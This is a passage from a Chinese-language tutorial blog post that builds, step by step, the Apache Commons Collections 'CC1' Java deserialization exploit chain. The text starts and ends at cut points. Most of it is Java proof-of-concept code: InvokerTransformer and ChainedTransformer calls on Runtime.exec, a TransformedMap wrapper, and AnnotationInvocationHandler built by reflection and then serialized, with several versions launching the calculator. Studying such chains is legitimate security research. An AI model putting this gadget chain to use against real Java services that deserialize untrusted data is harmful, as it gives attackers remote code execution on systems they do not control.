方法，结尾这里需要一个能够命令执行的方法。我们中间通过链子引导过去。所以我们的攻击一定是从尾部出发去寻找头的，流程图如下。</p><p><img src="/img/CC1/c04.png"></p><h3 id="寻找尾部的-exec-方法"><a href="#寻找尾部的-exec-方法" class="headerlink" title="寻找尾部的 exec 方法"></a>寻找尾部的 exec 方法</h3><p>我们直接来到cc1链的核心接口transfromer接口</p><p>快捷键 ctrl + alt + B，查看实现接口的类</p><p><img src="/img/CC1/c06.png"></p><p>其中InvokerTransformer很突出，因为我们知道方法是 Java 反射机制的核心方法，用于动态调用方法</p><p>转到InvokerTransformer类，成功找到了类中存在的一个反射调用任意类，可以作为我们链子的终点</p><p><img src="/img/CC1/c07.png"></p><p>复习一下反射poc</p><p>获取.class文件-&gt;获取方法-&gt;修改作用域(private方法)-&gt;invoke执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        Class c= Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        method.invoke(runtime,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写String.class的原因</p><p>在Java反射中，方法通过 <strong>方法名 + 参数类型列表</strong> 唯一标识：</p><table><thead><tr><th align="left">方法调用</th><th align="left">对应的exec重载版本</th></tr></thead><tbody><tr><td align="left"><code>getMethod(&quot;exec&quot;)</code></td><td align="left">❌ 编译错误（不明确）</td></tr><tr><td align="left"><code>getMethod(&quot;exec&quot;, String.class)</code></td><td align="left"><code>exec(String command)</code></td></tr><tr><td align="left"><code>getMethod(&quot;exec&quot;, String[].class)</code></td><td align="left"><code>exec(String[] cmdarray)</code></td></tr><tr><td align="left"><code>getMethod(&quot;exec&quot;, String.class, String[].class)</code></td><td align="left"><code>exec(String command, String[] envp)</code></td></tr></tbody></table><p>成功弹出计算器</p><p><img src="/img/CC1/c08.png"></p><p>接下来我们构造一个利用 <code>InvokerTransformer</code> 类弹计算器的程序</p><p>根据构造方法构造 EXP，因为是 public 的方法，这里无需反射</p><p><img src="/img/CC1/c09.png"></p><p>构造poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        invokerTransformer.transform(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p>与一开始使用反射的poc对比，其实就是找到了一个可以直接使用，无需反射的方法</p><ul><li>注意我们最后一句 <code>invokerTransformer.transform(runtime);</code></li><li>所以我们下一步的目标是去找调用 <code>transform</code> 方法的不同名函数</li></ul><h3 id="初步寻找链子"><a href="#初步寻找链子" class="headerlink" title="初步寻找链子"></a>初步寻找链子</h3><p>右键 –&gt; find usages(查找用法)，如果 find usages 这里有问题的话，可以先 <code>Ctrl+Alt+Shift+F7</code>，选择 <code>All place</code> 查询。</p><p>一共是有21处用法，需要逐个排查</p><p>目的是找到有其他方法调用transfrom，向上寻找入口</p><p>如何排查？</p><ol><li>调用transform方法的类可作为参数传入，可控制(能够使其调用invokerTransformer中的transform方法)</li><li>能够找到readObject链首</li></ol><p>这里找到 <code>TransformedMap</code> 类中存在 <code>checkSetValue()</code> 方法调用了 <code>transform()</code> 方法</p><p><img src="/img/CC1/c10.png"></p><ul><li><p>OK，接下来我们去看一看 <code>valueTransformer.checkSetValue</code> 的 <code>valueTransformer</code> 是什么东西，最终在 <code>TransformedMap</code> 的构造函数中发现了 <code>valueTransformer</code></p><p>但是是一个protected方法</p></li></ul><p><img src="/img/CC1/c11.png"></p><ul><li>继续向上查找，来到decorate方法</li></ul><p><img src="/img/CC1/c12.png"></p><p>看到此方法是public方法，尝试构造poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">decorateCalc</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);  <br> checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);  <br> checkSetValueMethod.invoke(decorateMap, runtime);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>构造poc的过程：</p><p>按照我们分析出的方法从前到后的调用流程 decorate(new TransformedMap)-&gt;checkSetValue(调用invokerTransformer的transform方法)</p><p>TransformedMap的构造方法是protected类型，所以需要decorate方法来new TransformedMap</p><p>这么一看，调用 <code>.decorate</code> 方法就很有必要了，这几句语句是为了运用 <code>.decorate</code> 方法而存在的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br>HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br><span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br></code></pre></td></tr></table></figure><p>接着，因为 <code>.decorate</code> 方法被调用，我们可以新建 <code>TransformedMap</code> 对象了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;<br></code></pre></td></tr></table></figure><p>再通过反射构造攻击手段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);  <br>checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);  <br>checkSetValueMethod.invoke(decorateMap, runtime);<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/img/CC1/c13.png"></p><h3 id="完整链子"><a href="#完整链子" class="headerlink" title="完整链子"></a>完整链子</h3><ul><li>目前找到的链子位于 <code>checkSetValue</code> 当中，去找 <code>.decorate</code> 的链子，发现无法进一步前进了，所以我们回到 <code>checkSetValue</code> 重新找链子，我们要找到readObject方法作为链首</li></ul><p>继续 <code>find usages</code>，找到了 <code>parent.checkSetValue(value);</code> 调用了 <code>checkSetValue</code></p><p>我们点进去看，发现这是一个抽象类，是 <code>TransformedMap</code> 的父类。</p><ul><li>调用 <code>checkSetValue</code> 方法的类是 <code>AbstractInputCheckedMapDecorator</code> 类中的一个内部类 <code>MapEntry</code></li></ul><p><img src="/img/CC1/c14.png"></p><p>setValue函数用来更新当前键值对的值，返回旧值，并会同步修改到所属的 <code>Map</code>，在进行Map遍历时，一定会走入setValue方法</p><p>这里追踪一下setValue函数</p><p><img src="/img/CC1/c15.png"></p><p><img src="/img/CC1/c16.png"></p><p>所以，我们在进行 <code>.decorate</code> 方法调用，进行 Map 遍历的时候，就会走到 <code>setValue()</code> 当中，而 <code>setValue()</code> 就会调用 <code>checkSetValue</code></p><p>这里可以测试一下，看看遍历Map是否会调用setValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">setValue01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;Object,Object&gt; entry : decorate.entrySet()) &#123;<br>            entry.setValue(runtime);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>顺利弹出计算器</p><p><img src="/img/CC1/c17.png"></p><ul><li>到此处，我们的攻击思路出来了，找到一个是数组的入口类，遍历这个数组，并执行 <code>setValue</code> 方法，即可构造 Poc。</li></ul><p>一句话概括一下</p><blockquote><p>如何遍历一个Map最终执行 <code>setValue()</code> 方法</p></blockquote><p><strong>如果能找到一个 <code>readObject()</code> 里面调用了 <code>setValue()</code> 就太好了</strong></p><h3 id="寻找-readObject-–-链首"><a href="#寻找-readObject-–-链首" class="headerlink" title="寻找 readObject() – 链首"></a>寻找 readObject() – 链首</h3><ul><li>之前链子是到 <code>setValue</code> 的，所以我们在 <code>setValue</code> 处，查找用法</li></ul><p>在AnnotationInvocationHandler.class的readObject方法</p><p><img src="/img/CC1/c18.png"></p><p>先看构造方法(为了实例化这个类)</p><p><img src="/img/CC1/c19.png"></p><p>可以看到有Map类型参数，可以将我们构造好的Map类型参数payload直接传入</p><p>但是此方法并不是public，在java中，只要没有写public，作用域便是default，我们需要通过反射的方式来获取这个类及其构造函数，再实例化它。</p><p>同时关注到能够进入setValue方法需要满足的两个条件</p><p><img src="/img/CC1/c20.png"></p><h2 id="TransformMap版CC1手写-EXP"><a href="#TransformMap版CC1手写-EXP" class="headerlink" title="TransformMap版CC1手写 EXP"></a>TransformMap版CC1手写 EXP</h2><h3 id="初始框架"><a href="#初始框架" class="headerlink" title="初始框架"></a>初始框架</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;<br><br>        <span class="hljs-comment">//危险方法，核心危险参数构造</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>        <span class="hljs-comment">//反射获取AnnotationInvocationHandler(),实例化AnnotationInvocationHandler类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance(Override.class, decorate);<br><br>        <span class="hljs-comment">//序列化反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="问题一：Runtime类无法序列化"><a href="#问题一：Runtime类无法序列化" class="headerlink" title="问题一：Runtime类无法序列化"></a>问题一：Runtime类无法序列化</h3><p><code>Runtime</code> 是不能序列化的，因为Runtime类没有继承序列化接口 java.io.Serializable</p><p>但是 <code>Runtime.class</code> 是可以序列化的，Class类继承了序列化接口，所有.class文件都可以序列化</p><p>我们先写一遍普通反射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">problem01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 获取Runtime实例</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) getRuntime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着，我们将这个反射的 <code>Runtime</code> 改造为使用 <code>InvokerTransformer</code> 调用的方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">problem01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">        Class c = Runtime.class;</span><br><span class="hljs-comment">        Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);</span><br><span class="hljs-comment">        // 获取Runtime实例</span><br><span class="hljs-comment">        Runtime runtime = (Runtime) getRuntime.invoke(null, null);</span><br><span class="hljs-comment">        Method exec = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(runtime, &quot;calc&quot;);</span><br><span class="hljs-comment">        **/</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-comment">//Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(c);<br>        <span class="hljs-comment">//获取Runtime实例  Runtime runtime = (Runtime) getRuntime.invoke(null, null);</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br>        <span class="hljs-comment">//Method exec = c.getMethod(&quot;exec&quot;, String.class);</span><br>        <span class="hljs-comment">//Object exec = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;exec&quot;, null&#125;).transform(c);</span><br>        <span class="hljs-comment">//在实例调用方法执行反射</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>顺利弹出计算器</p><p>稍微理一理可以看到，上方主函数最后三行代码有一个共同点就是：</p><ul><li>格式都为 <code>new InvokerTransformer().transform()</code></li><li>后一个 <code>transform()</code> 方法里的参数都是前一个的结果</li></ul><p>从代码的复用性角度来说，我们应当减少这种复用的工作量，于是我们使用 <code>ChainedTransformer</code> 这个类。</p><p><img src="/img/CC1/c21.png"></p><p>ChainedTransformer函数会将传回的数组进行递归调用</p><p><code>ChainedTransformer</code> 类下的 <code>transform</code> 方法递归调用了前一个方法的结果，作为后一个方法的参数。</p><ul><li>知道了用法之后编写 EXP，先定义一个数组，然后将数组传到 <code>ChainedTransformer</code> 类中，再调用 <code>.transform</code> 方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 